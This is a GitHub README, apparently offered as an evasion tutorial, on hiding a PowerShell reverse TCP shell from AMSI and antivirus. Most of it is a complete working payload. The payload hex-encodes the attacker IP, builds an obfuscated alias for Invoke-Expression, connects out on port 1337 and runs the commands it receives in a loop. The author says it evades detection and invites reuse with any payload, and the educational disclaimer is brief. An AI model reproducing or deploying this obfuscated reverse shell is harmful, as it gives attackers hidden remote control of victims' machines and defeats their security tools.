# Windows-AMSI-Bypass-Evasion
Bypass AMSI using powershell

<h1>🔎 - What is this? </h1>

This repo is going to be to evade most antivirus via PowerShell obfuscation.
It's not something new, but many people asked me how to hide an existing payload or a reverse shell from powershell which is already detectable
<br>I will use an existing payload (reverse tcp with powershell) <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1"> You can view it here </a><br>
When you run this simple payload it will be detected in 100% of cases <br>
<img src="https://img001.prntscr.com/file/img001/WsO4LOjjRCGdSRSwIA6Yow.png">
<br>
<h1>🧨 - How to avoid being detected? </h1>

Now the goal is to hide each of the above commands separately so that they are not detected as malicious<br>
First we need to encode our ip address<br>
<img src="https://img001.prntscr.com/file/img001/4PTb8EsuRjCDjBGXhtAUpQ.png">
<br>  Full payload : 
<pre>while ($true) {
    $px = "c0","a8","38","1"
    $p = ($px | ForEach { [convert]::ToInt32($_,16) }) -join '.'
    $w = "GET /amsi.html HTTP/1.1`r`nHost: $p`r`nMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36`r`nAccept: text/html`r`n`r`n"
    $s = [System.Text.ASCIIEncoding]
    [byte[]]$b = 0..65535|%{0}
    $x = "n-eiorvsxpk5"
    Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158])
    $y = New-Object System.Net.Sockets.TCPClient($p,1337)
    $z = $y.GetStream()
    $d = $s::UTF8.GetBytes($w)
    $z.Write($d, 0, $d.Length)
    $t = (n-eiorvsxpk5 whoami) + "$ "
    while(($l = $z.Read($b, 0, $b.Length)) -ne 0){
        $v = (New-Object -TypeName $s).GetString($b,0, $l)        
        $d = $s::UTF8.GetBytes((n-eiorvsxpk5 $v 2>&1 | Out-String )) + $s::UTF8.GetBytes($t)
        $z.Write($d, 0, $d.Length)
    }
    $y.Close()
    Start-Sleep -Seconds 5
}
}
</pre><br>

<h1>💣 - Result  </h1> 
The payload was successfully executed without any detection... You can do this for all the payloads you want <br>
<img src="https://img001.prntscr.com/file/img001/mRAuoKkNR8G1_0ttKli-LA.png"> <br>

<h1>ℹ️ Disclaimer</H1>
This script should only be used for educational and testing purposes.
Use it only on your own networks.
The authors are not responsible for their uses.
